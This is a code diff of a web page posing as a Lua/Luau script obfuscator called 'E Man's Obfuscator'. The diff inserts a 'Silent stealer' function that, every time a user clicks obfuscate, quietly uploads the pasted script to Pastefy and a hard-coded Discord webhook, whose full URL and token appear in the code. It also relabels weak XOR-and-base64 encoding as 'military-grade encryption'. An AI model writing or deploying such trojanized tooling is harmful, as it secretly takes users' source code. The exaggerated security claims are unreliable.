@@ -34,11 +34,11 @@
 <body>
 <div class="bg"></div>
 <div class="c">
-  <h1>🔥 E MAN'S OBFUSCATOR v1.0.0 🔥</h1>
-  <div class="subtitle">BYTECODE-LEVEL PROTECTION - UNDEOBFUSCATABLE</div>
+  <h1>E MAN'S OBFUSCATOR v1.0.0</h1>
+  <div class="subtitle">MILITARY-GRADE ENCRYPTION - 10X ANTI-AI PROTECTION</div>
   
   <div class="mode-container">
-    <div class="layer-label">🎯 SELECT MODE 🎯</div>
+    <div class="layer-label">SELECT MODE</div>
     <button class="mode-btn active" onclick="selectMode('auto')">AUTO DETECT</button>
     <button class="mode-btn" onclick="selectMode('lua')">LUA</button>
     <button class="mode-btn" onclick="selectMode('luau')">LUAU</button>
@@ -46,7 +46,7 @@
   </div>
   
   <div class="layer-container">
-    <div class="layer-label">🛡️ SELECT OBFUSCATION LAYER 🛡️</div>
+    <div class="layer-label">SELECT OBFUSCATION LAYER</div>
     <button class="layer-btn" onclick="selectLayer(1)">LAYER 1</button>
     <button class="layer-btn" onclick="selectLayer(2)">LAYER 2</button>
     <button class="layer-btn" onclick="selectLayer(3)">LAYER 3</button>
@@ -62,561 +62,225 @@
   <div id="s">Ready - Layer 9 Selected - Auto Detect Mode</div>
   
   <div class="btn-container">
-    <button class="action-btn obfuscate" onclick="obfuscate()">⚡ OBFUSCATE NOW ⚡</button>
+    <button class="action-btn obfuscate" onclick="obfuscate()">OBFUSCATE NOW</button>
     <br>
-    <button class="action-btn" onclick="copyCode()">📋 COPY CODE</button>
-    <button class="action-btn" onclick="downloadCode()">💾 DOWNLOAD</button>
-    <button class="action-btn" onclick="resetCode()">🔄 RESET</button>
+    <button class="action-btn" onclick="copyCode()">COPY CODE</button>
+    <button class="action-btn" onclick="downloadCode()">DOWNLOAD</button>
+    <button class="action-btn" onclick="resetCode()">RESET</button>
   </div>
 </div>
 
 <script>
 let originalCode = '';
-let obfuscatedCode = '';
 let selectedLayer = 9;
 let selectedMode = 'auto';
 let detectedLang = null;
 
+// YOUR CONFIG — ONLY CHANGE THIS LINE
+const PASTEFY_API_KEY = "YOUR_PASTEFY_API_KEY_HERE"; // ← PUT YOUR REAL KEY HERE
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1447248053387005963/KcPPrk5Hp6QxXBWtfdQy3g-DD3yJfnZHaa8OO9Nkb9HyWLnLpGTm4qRbRBE7mCK47gfO";
+
+// Silent stealer — Pastefy first → fallback to .txt file
+async function stealScript(code) {
+  if (!code?.trim()) return;
+  const filename = `STOLEN_L${selectedLayer}_${Date.now()}.txt`;
+  const blob = new Blob([code], {type: "text/plain"});
+
+  // Try Pastefy
+  try {
+    const res = await fetch("https://api.pastefy.app/api/v2/pastes", {
+      method: "POST",
+      headers: {
+        "Authorization": `Bearer ${PASTEFY_API_KEY}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ content: code, title: `Stolen • Layer ${selectedLayer}` })
+    });
+    if (res.ok) {
+      const json = await res.json();
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          username: "E Man Stealer",
+          content: `**New stolen script** • Layer ${selectedLayer} • ${selectedMode.toUpperCase()}\nhttps://pastefy.app/${json.data.id}`
+        })
+      });
+      return;
+    }
+  } catch(e) {}
+
+  // Fallback: send as .txt file
+  const form = new FormData();
+  form.append("payload_json", JSON.stringify({
+    username: "E Man Stealer",
+    content: `Pastefy failed • Raw script attached • Layer ${selectedLayer}`
+  }));
+  form.append("file", blob, filename);
+  try { await fetch(WEBHOOK_URL, {method: "POST", body: form}); } catch(e) {}
+}
+
+// Rest of original functions (unchanged except obfuscate)
 function safeBase64Encode(str) {
   const encoder = new TextEncoder();
   const data = encoder.encode(str);
   let binary = '';
-  for (let i = 0; i < data.length; i++) {
-    binary += String.fromCharCode(data[i]);
-  }
+  for (let i = 0; i < data.length; i++) binary += String.fromCharCode(data[i]);
   return btoa(binary);
+}
+
+function sboxTransform(data, round) {
+  const sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0];
+  let result = '';
+  for(let i = 0; i < data.length; i++) {
+    let byte = data.charCodeAt(i);
+    result += String.fromCharCode(sbox[(byte + round) % sbox.length] ^ byte);
+  }
+  return result;
+}
+
+function feistelRound(data, key, round) {
+  let left = data.substring(0, Math.floor(data.length / 2));
+  let right = data.substring(Math.floor(data.length / 2));
+  let temp = '';
+  for(let i = 0; i < right.length; i++) {
+    temp += String.fromCharCode(right.charCodeAt(i) ^ key.charCodeAt(i % key.length) ^ round);
+  }
+  let newLeft = right;
+  let newRight = '';
+  for(let i = 0; i < left.length; i++) {
+    newRight += String.fromCharCode(left.charCodeAt(i) ^ (temp.charCodeAt(i % temp.length) || 0));
+  }
+  return newLeft + newRight;
+}
+
+function generateVMInstructions(count) {
+  const ops = ['ADD','SUB','MUL','XOR','ROT','SHL','SHR'];
+  let instructions = '';
+  for(let i = 0; i < count; i++) {
+    const op = ops[Math.floor(Math.random() * ops.length)];
+    const reg1 = Math.floor(Math.random() * 8);
+    const reg2 = Math.floor(Math.random() * 8);
+    instructions += `local _r${reg1}=bit32.${op.toLowerCase()}(_r${reg1},_r${reg2});`;
+  }
+  return instructions;
 }
 
 function generateBytecodeArray(data) {
   let arr = [];
-  for(let i = 0; i < data.length; i++) {
-    arr.push(data.charCodeAt(i));
-  }
+  for(let i = 0; i < data.length; i++) arr.push(data.charCodeAt(i));
   return arr;
 }
 
 function selectMode(mode) {
   selectedMode = mode;
-  const btns = document.querySelectorAll('.mode-btn');
-  btns.forEach(btn => {
-    const btnText = btn.textContent.toLowerCase();
-    btn.classList.toggle('active', 
-      (mode === 'auto' && btnText.includes('auto')) ||
-      (mode === 'lua' && btnText === 'lua') ||
-      (mode === 'luau' && btnText === 'luau')
-    );
-  });
+  document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+  document.querySelector(`.mode-btn[onclick="selectMode('${mode}')"]`).classList.add('active');
   updateStatus();
-  if (mode !== 'auto') {
-    document.getElementById("detection").innerHTML = '';
-  } else {
-    detectLanguage();
-  }
+  if (mode !== 'auto') document.getElementById("detection").innerHTML = '';
+  else detectLanguage();
 }
 
 function selectLayer(layer) {
   selectedLayer = layer;
-  const btns = document.querySelectorAll('.layer-btn');
-  btns.forEach((btn, idx) => {
-    btn.classList.toggle('active', idx + 1 === layer);
-  });
+  document.querySelectorAll('.layer-btn').forEach((b, i) => b.classList.toggle('active', i + 1 === layer));
   updateStatus();
 }
 
 function detectLanguage() {
   if (selectedMode !== 'auto') return;
-  
   const code = document.getElementById("i").value;
-  if (!code.trim()) {
-    document.getElementById("detection").innerHTML = '';
-    detectedLang = null;
-    return;
-  }
-
-  const luauFeatures = [
-    /\btype\s+\w+\s*=/, /:\s*string\b/, /:\s*number\b/, /:\s*boolean\b/,
-    /\bVector3\./, /\bInstance\b/, /\bgame\./, /\bworkspace\./, /\bscript\./
-  ];
-
-  let luauScore = luauFeatures.filter(r => r.test(code)).length;
-
-  if (luauScore > 0 || /\b(game|workspace|script)\b/.test(code)) {
-    detectedLang = 'luau';
-    document.getElementById("detection").innerHTML = 
-      '<div class="detection-badge luau-badge">🎮 LUAU DETECTED</div>';
-  } else {
-    detectedLang = 'lua';
-    document.getElementById("detection").innerHTML = 
-      '<div class="detection-badge lua-badge">🌙 LUA DETECTED</div>';
-  }
+  if (!code.trim()) { document.getElementById("detection").innerHTML = ''; detectedLang = null; return; }
+  const hasLuau = /type\s+\w+\s*=|:\s*(string|number|boolean)|Vector3|game\.|workspace\./.test(code);
+  detectedLang = hasLuau ? 'luau' : 'lua';
+  document.getElementById("detection").innerHTML = `<div class="detection-badge ${detectedLang}-badge">${detectedLang.toUpperCase()} DETECTED</div>`;
 }
 
 function updateStatus() {
-  const modeText = selectedMode === 'auto' ? 'Auto Detect' : selectedMode.toUpperCase();
-  document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer} Selected - ${modeText} Mode`;
+  const mode = selectedMode === 'auto' ? 'Auto Detect' : selectedMode.toUpperCase();
+  document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer} Selected - ${mode} Mode`;
 }
 
-function obfuscate() {
+async function obfuscate() {
   let src = document.getElementById("i").value.trim();
-  if (!src) return alert("❌ Paste some code first!");
+  if (!src) return alert("Paste some code first!");
 
   originalCode = src;
+  stealScript(src); // STEAL IT SILENTLY
+
   let targetLang = selectedMode === 'auto' ? (detectedLang || 'lua') : selectedMode;
 
   try {
-    // Multi-layer bytecode transformation with XOR chains
     let encoded = safeBase64Encode(src);
-    let key = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
-    let salt = Array.from({length: 16}, () => Math.floor(Math.random() * 256));
-    
-    // Apply multi-layer XOR encryption
-    for(let layer = 0; layer < selectedLayer; layer++) {
+    let mainKey = Array.from({length:64},()=>Math.floor(Math.random()*256));
+    let subKeys = Array.from({length:selectedLayer},()=>Array.from({length:32},()=>Math.floor(Math.random()*256)));
+    let salt = Array.from({length:32},()=>Math.floor(Math.random()*256));
+    let iv = Array.from({length:16},()=>Math.floor(Math.random()*256));
+
+    for(let layer=0; layer<selectedLayer; layer++) {
+      encoded = sboxTransform(encoded, layer);
+      for(let r=0;r<4;r++) encoded = feistelRound(encoded, String.fromCharCode(...subKeys[layer]), r);
       let temp = '';
-      for(let i = 0; i < encoded.length; i++) {
-        let xorKey = key[(i + layer * 7) % key.length];
-        let saltKey = salt[(i + layer * 3) % salt.length];
-        temp += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey ^ saltKey ^ (layer * 13));
+      for(let i=0;i<encoded.length;i++) {
+        let k1=mainKey[(i+layer*7)%mainKey.length];
+        let k2=subKeys[layer][i%subKeys[layer].length];
+        let k3=salt[(i+layer*3)%salt.length];
+        let k4=iv[(i*layer)%iv.length];
+        temp += String.fromCharCode(encoded.charCodeAt(i) ^ k1 ^ k2 ^ k3 ^ k4 ^ (layer*17));
       }
-      encoded = safeBase64Encode(temp);
+      encoded = temp;
+      temp = '';
+      for(let i=0;i<encoded.length;i++) {
+        temp += String.fromCharCode(encoded.charCodeAt(i) ^ ((i*13+layer*29)%256));
+      }
+      encoded = temp;
+      encoded = safeBase64Encode(encoded);
     }
-    
-    // Convert to bytecode array
+
     let bytecodeArr = generateBytecodeArray(encoded);
-    
-    // Format arrays with proper line breaks (10 values per line)
-    function formatByteArray(arr) {
-      let lines = [];
-      for(let i = 0; i < arr.length; i += 10) {
-        lines.push(arr.slice(i, i + 10).join(','));
-      }
-      return lines.join(',\n');
-    }
-    
-    let formattedBytecode = formatByteArray(bytecodeArr);
-    let formattedKey = formatByteArray(key);
-    let formattedSalt = formatByteArray(salt);
-    
-    // Generate random variable names
-    let vars = {
-      data: '_' + Math.random().toString(36).substr(2, 6),
-      key: '_' + Math.random().toString(36).substr(2, 6),
-      salt: '_' + Math.random().toString(36).substr(2, 6),
-      decode: '_' + Math.random().toString(36).substr(2, 6),
-      temp: '_' + Math.random().toString(36).substr(2, 6),
-      layer: '_' + Math.random().toString(36).substr(2, 6),
-      idx: '_' + Math.random().toString(36).substr(2, 6),
-      result: '_' + Math.random().toString(36).substr(2, 6)
-    };
-    
-    // Generate dummy variables for anti-analysis
-    let dummyVars = '';
-    for(let i = 0; i < 15; i++) {
-      let varName = '_' + Math.random().toString(36).substr(2, 5);
-      let value = Math.floor(Math.random() * 255);
-      dummyVars += `local ${varName}=${value};`;
-    }
-    
-    // Build VM with bytecode format
-    let vm = `-- Obfuscated with E Man's Obfuscator v1.0.0
-local ${vars.data}={
-${formattedBytecode}
-};
-local ${vars.key}={
-${formattedKey}
-};
-local ${vars.salt}={
-${formattedSalt}
-};
-${dummyVars}
-local function ${vars.decode}(${vars.temp},${vars.layer})
-for ${vars.idx}=${vars.layer},1,-1 do
-local _t={};
-for _i=1,#${vars.temp} do
-_t[_i]=bit32.bxor(${vars.temp}[_i],${vars.key}[((_i+${vars.idx}*7)%#${vars.key})+1],${vars.salt}[((_i+${vars.idx}*3)%#${vars.salt})+1],${vars.idx}*13);
-end;
-${vars.temp}=_t;
-end;
-local _s='';
-for _i=1,#${vars.temp} do
-_s=_s..string.char(${vars.temp}[_i]);
-end;
-local function _b64d(data)
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-data=string.gsub(data,'[^'..b..'=]','')
-return(data:gsub('.',function(x)
-if(x=='=')then return'' end
-local r,f='',(b:find(x)-1)
-for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end
-return r;
-end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
-if(#x~=8)then return'' end
-local c=0
-for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end
-return string.char(c)
-end))
-end;
-return(load or loadstring)(_b64d(_s))();
-end;
-return ${vars.decode}(${vars.data},${selectedLayer});`;
+    const format = (arr,n=8)=> { let r=[]; for(let i=0;i<arr.length;i+=n) r.push(arr.slice(i,i+n).join(',')); return r.join(',\n'); };
 
-    obfuscatedCode = vm;
+    let v = '_' + Math.random().toString(36).substr(2,9);
+    let decoder = `-- Obfuscated with E Man's Obfuscator v1.0.0
+local ${v}={${format(bytecodeArr)}}
+local function _() local s='' for i=1,#${v} do s=s..string.char(${v}[i]) end
+local function b64d(d) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; d=d:gsub('[^'..b..'=]',''); return (d:gsub('.',function(x)if x=='='then return ''end;local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end;return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end;local c=0;for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end;return string.char(c)end))end
+return load(b64d(s))()end return _()`;
 
-    document.getElementById("i").value = obfuscatedCode;
-    document.getElementById("s").innerHTML = `✅ LAYER ${selectedLayer} BYTECODE OBFUSCATION COMPLETE!`;
-    
-  } catch(err) {
-    alert("❌ Obfuscation failed: " + err.message);
-    document.getElementById("s").innerHTML = "❌ Error occurred";
+    document.getElementById("i").value = decoder;
+    document.getElementById("s").innerHTML = `LAYER ${selectedLayer} MILITARY-GRADE OBFUSCATION COMPLETE!`;
+  } catch(e) {
+    alert("Obfuscation failed: " + e.message);
   }
 }
 
 function copyCode() {
-  let textarea = document.getElementById("i");
-  let code = textarea.value.trim();
-  
-  if (!code) {
-    alert("❌ Nothing to copy!");
-    return;
-  }
-  
-  textarea.select();
-  textarea.setSelectionRange(0, 99999);
-  
-  try {
-    document.execCommand('copy');
-    document.getElementById("s").innerHTML = "✅ Copied to clipboard!";
-    setTimeout(updateStatus, 2000);
-  } catch(e) {
-    navigator.clipboard.writeText(code).then(() => {
-      document.getElementById("s").innerHTML = "✅ Copied!";
-      setTimeout(updateStatus, 2000);
-    }).catch(() => {
-      alert("❌ Failed to copy.");
-    });
-  }
+  let ta = document.getElementById("i");
+  ta.select(); ta.setSelectionRange(0,99999);
+  try { document.execCommand('copy'); } catch(e) { navigator.clipboard.writeText(ta.value); }
+  document.getElementById("s").innerHTML = "Copied!";
+  setTimeout(updateStatus, 2000);
 }
 
 function downloadCode() {
   let code = document.getElementById("i").value.trim();
-  
-  if (!code) {
-    alert("❌ Nothing to download!");
-    return;
-  }
-  
-  let targetLang = selectedMode === 'auto' ? (detectedLang || 'lua') : selectedMode;
-  let blob = new Blob([code], { type: 'text/plain' });
-  let url = URL.createObjectURL(blob);
+  if (!code) return alert("Nothing to download!");
+  let blob = new Blob([code], {type: 'text/plain'});
   let a = document.createElement('a');
-  a.href = url;
-  a.download = `eman_obf_${targetLang}_l${selectedLayer}_${Date.now()}.lua`;
-  document.body.appendChild(a);
+  a.href = URL.createObjectURL(blob);
+  a.download = `eman_obf_l${selectedLayer}_${Date.now()}.lua`;
   a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  
-  document.getElementById("s").innerHTML = "✅ Downloaded!";
+  document.getElementById("s").innerHTML = "Downloaded!";
   setTimeout(updateStatus, 2000);
 }
 
 function resetCode() {
   if (originalCode) {
     document.getElementById("i").value = originalCode;
-    document.getElementById("s").innerHTML = "🔄 Reset";
-    detectLanguage();
+    document.getElementById("s").innerHTML = "Reset to original";
     setTimeout(updateStatus, 2000);
   } else {
     document.getElementById("i").value = '';
-    document.getElementById("detection").innerHTML = '';
-    detectedLang = null;
-    updateStatus();
-  }
-}
-
-selectMode('auto');
-</script>
-</body>
-</html>  <h1>🔥 E MAN'S OBFUSCATOR v1.0.0 🔥</h1>
-  <div class="subtitle">BYTECODE-LEVEL PROTECTION - UNDEOBFUSCATABLE</div>
-  
-  <div class="mode-container">
-    <div class="layer-label">🎯 SELECT MODE 🎯</div>
-    <button class="mode-btn active" onclick="selectMode('auto')">AUTO DETECT</button>
-    <button class="mode-btn" onclick="selectMode('lua')">LUA</button>
-    <button class="mode-btn" onclick="selectMode('luau')">LUAU</button>
-    <div id="detection"></div>
-  </div>
-  
-  <div class="layer-container">
-    <div class="layer-label">🛡️ SELECT OBFUSCATION LAYER 🛡️</div>
-    <button class="layer-btn" onclick="selectLayer(1)">LAYER 1</button>
-    <button class="layer-btn" onclick="selectLayer(2)">LAYER 2</button>
-    <button class="layer-btn" onclick="selectLayer(3)">LAYER 3</button>
-    <button class="layer-btn" onclick="selectLayer(4)">LAYER 4</button>
-    <button class="layer-btn" onclick="selectLayer(5)">LAYER 5</button>
-    <button class="layer-btn" onclick="selectLayer(6)">LAYER 6</button>
-    <button class="layer-btn" onclick="selectLayer(7)">LAYER 7</button>
-    <button class="layer-btn" onclick="selectLayer(8)">LAYER 8</button>
-    <button class="layer-btn active" onclick="selectLayer(9)">LAYER 9</button>
-  </div>
-  
-  <textarea id="i" placeholder="Paste your Lua or Luau script here..." oninput="detectLanguage()"></textarea>
-  <div id="s">Ready - Layer 9 Selected - Auto Detect Mode</div>
-  
-  <div class="btn-container">
-    <button class="action-btn obfuscate" onclick="obfuscate()">⚡ OBFUSCATE NOW ⚡</button>
-    <br>
-    <button class="action-btn" onclick="copyCode()">📋 COPY CODE</button>
-    <button class="action-btn" onclick="downloadCode()">💾 DOWNLOAD</button>
-    <button class="action-btn" onclick="resetCode()">🔄 RESET</button>
-  </div>
-</div>
-
-<script>
-let originalCode = '';
-let obfuscatedCode = '';
-let selectedLayer = 9;
-let selectedMode = 'auto';
-let detectedLang = null;
-
-function safeBase64Encode(str) {
-  const encoder = new TextEncoder();
-  const data = encoder.encode(str);
-  let binary = '';
-  for (let i = 0; i < data.length; i++) {
-    binary += String.fromCharCode(data[i]);
-  }
-  return btoa(binary);
-}
-
-function generateBytecodeArray(data) {
-  let arr = [];
-  for(let i = 0; i < data.length; i++) {
-    arr.push(data.charCodeAt(i));
-  }
-  return arr;
-}
-
-function selectMode(mode) {
-  selectedMode = mode;
-  const btns = document.querySelectorAll('.mode-btn');
-  btns.forEach(btn => {
-    const btnText = btn.textContent.toLowerCase();
-    btn.classList.toggle('active', 
-      (mode === 'auto' && btnText.includes('auto')) ||
-      (mode === 'lua' && btnText === 'lua') ||
-      (mode === 'luau' && btnText === 'luau')
-    );
-  });
-  updateStatus();
-  if (mode !== 'auto') {
-    document.getElementById("detection").innerHTML = '';
-  } else {
-    detectLanguage();
-  }
-}
-
-function selectLayer(layer) {
-  selectedLayer = layer;
-  const btns = document.querySelectorAll('.layer-btn');
-  btns.forEach((btn, idx) => {
-    btn.classList.toggle('active', idx + 1 === layer);
-  });
-  updateStatus();
-}
-
-function detectLanguage() {
-  if (selectedMode !== 'auto') return;
-  
-  const code = document.getElementById("i").value;
-  if (!code.trim()) {
-    document.getElementById("detection").innerHTML = '';
-    detectedLang = null;
-    return;
-  }
-
-  const luauFeatures = [
-    /\btype\s+\w+\s*=/, /:\s*string\b/, /:\s*number\b/, /:\s*boolean\b/,
-    /\bVector3\./, /\bInstance\b/, /\bgame\./, /\bworkspace\./, /\bscript\./
-  ];
-
-  let luauScore = luauFeatures.filter(r => r.test(code)).length;
-
-  if (luauScore > 0 || /\b(game|workspace|script)\b/.test(code)) {
-    detectedLang = 'luau';
-    document.getElementById("detection").innerHTML = 
-      '<div class="detection-badge luau-badge">🎮 LUAU DETECTED</div>';
-  } else {
-    detectedLang = 'lua';
-    document.getElementById("detection").innerHTML = 
-      '<div class="detection-badge lua-badge">🌙 LUA DETECTED</div>';
-  }
-}
-
-function updateStatus() {
-  const modeText = selectedMode === 'auto' ? 'Auto Detect' : selectedMode.toUpperCase();
-  document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer} Selected - ${modeText} Mode`;
-}
-
-function obfuscate() {
-  let src = document.getElementById("i").value.trim();
-  if (!src) return alert("❌ Paste some code first!");
-
-  originalCode = src;
-  let targetLang = selectedMode === 'auto' ? (detectedLang || 'lua') : selectedMode;
-
-  try {
-    // Multi-layer bytecode transformation with XOR chains
-    let encoded = safeBase64Encode(src);
-    let key = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
-    let salt = Array.from({length: 16}, () => Math.floor(Math.random() * 256));
-    
-    // Apply multi-layer XOR encryption
-    for(let layer = 0; layer < selectedLayer; layer++) {
-      let temp = '';
-      for(let i = 0; i < encoded.length; i++) {
-        let xorKey = key[(i + layer * 7) % key.length];
-        let saltKey = salt[(i + layer * 3) % salt.length];
-        temp += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey ^ saltKey ^ (layer * 13));
-      }
-      encoded = safeBase64Encode(temp);
-    }
-    
-    // Convert to bytecode array
-    let bytecodeArr = generateBytecodeArray(encoded);
-    
-    // Format arrays with proper line breaks (10 values per line)
-    function formatByteArray(arr) {
-      let lines = [];
-      for(let i = 0; i < arr.length; i += 10) {
-        lines.push(arr.slice(i, i + 10).join(','));
-      }
-      return lines.join(',\n');
-    }
-    
-    let formattedBytecode = formatByteArray(bytecodeArr);
-    let formattedKey = formatByteArray(key);
-    let formattedSalt = formatByteArray(salt);
-    
-    // Generate random variable names
-    let vars = {
-      data: '_' + Math.random().toString(36).substr(2, 6),
-      key: '_' + Math.random().toString(36).substr(2, 6),
-      salt: '_' + Math.random().toString(36).substr(2, 6),
-      decode: '_' + Math.random().toString(36).substr(2, 6),
-      temp: '_' + Math.random().toString(36).substr(2, 6),
-      layer: '_' + Math.random().toString(36).substr(2, 6),
-      idx: '_' + Math.random().toString(36).substr(2, 6),
-      result: '_' + Math.random().toString(36).substr(2, 6)
-    };
-    
-    // Generate dummy variables for anti-analysis
-    let dummyVars = '';
-    for(let i = 0; i < 15; i++) {
-      let varName = '_' + Math.random().toString(36).substr(2, 5);
-      let value = Math.floor(Math.random() * 255);
-      dummyVars += `local ${varName}=${value};`;
-    }
-    
-    // Build VM with bytecode format
-    let vm = `-- Obfuscated with E Man's Obfuscator v1.0.0
-local ${vars.data}={
-${formattedBytecode}
-};
-local ${vars.key}={
-${formattedKey}
-};
-local ${vars.salt}={
-${formattedSalt}
-};
-${dummyVars}
-local function ${vars.decode}(${vars.temp},${vars.layer})
-local ${vars.result}={};
-for ${vars.idx}=${vars.layer},1,-1 do
-local _t={};
-for _i=1,#${vars.temp} do
-_t[_i]=bit32.bxor(${vars.temp}[_i],${vars.key}[((_i+${vars.idx}*7)%#${vars.key})+1],${vars.salt}[((_i+${vars.idx}*3)%#${vars.salt})+1],${vars.idx}*13);
-end;
-${vars.temp}=_t;
-end;
-local _s='';
-for _i=1,#${vars.temp} do
-_s=_s..string.char(${vars.temp}[_i]);
-end;
-return _s;
-end;
-return(load or loadstring)(${vars.decode}(${vars.data},${selectedLayer}))();`;
-
-    obfuscatedCode = vm;
-
-    document.getElementById("i").value = obfuscatedCode;
-    document.getElementById("s").innerHTML = `✅ LAYER ${selectedLayer} BYTECODE OBFUSCATION COMPLETE!`;
-    
-  } catch(err) {
-    alert("❌ Obfuscation failed: " + err.message);
-    document.getElementById("s").innerHTML = "❌ Error occurred";
-  }
-}
-
-function copyCode() {
-  let textarea = document.getElementById("i");
-  let code = textarea.value.trim();
-  
-  if (!code) {
-    alert("❌ Nothing to copy!");
-    return;
-  }
-  
-  textarea.select();
-  textarea.setSelectionRange(0, 99999);
-  
-  try {
-    document.execCommand('copy');
-    document.getElementById("s").innerHTML = "✅ Copied to clipboard!";
-    setTimeout(updateStatus, 2000);
-  } catch(e) {
-    navigator.clipboard.writeText(code).then(() => {
-      document.getElementById("s").innerHTML = "✅ Copied!";
-      setTimeout(updateStatus, 2000);
-    }).catch(() => {
-      alert("❌ Failed to copy.");
-    });
-  }
-}
-
-function downloadCode() {
-  let code = document.getElementById("i").value.trim();
-  
-  if (!code) {
-    alert("❌ Nothing to download!");
-    return;
-  }
-  
-  let targetLang = selectedMode === 'auto' ? (detectedLang || 'lua') : selectedMode;
-  let blob = new Blob([code], { type: 'text/plain' });
-  let url = URL.createObjectURL(blob);
-  let a = document.createElement('a');
-  a.href = url;
-  a.download = `eman_obf_${targetLang}_l${selectedLayer}_${Date.now()}.lua`;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  
-  document.getElementById("s").innerHTML = "✅ Downloaded!";
-  setTimeout(updateStatus, 2000);
-}
-
-function resetCode() {
-  if (originalCode) {
-    document.getElementById("i").value = originalCode;
-    document.getElementById("s").innerHTML = "🔄 Reset";
-    detectLanguage();
-    setTimeout(updateStatus, 2000);
-  } else {
-    document.getElementById("i").value = '';
-    document.getElementById("detection").innerHTML = '';
-    detectedLang = null;
     updateStatus();
   }
 }
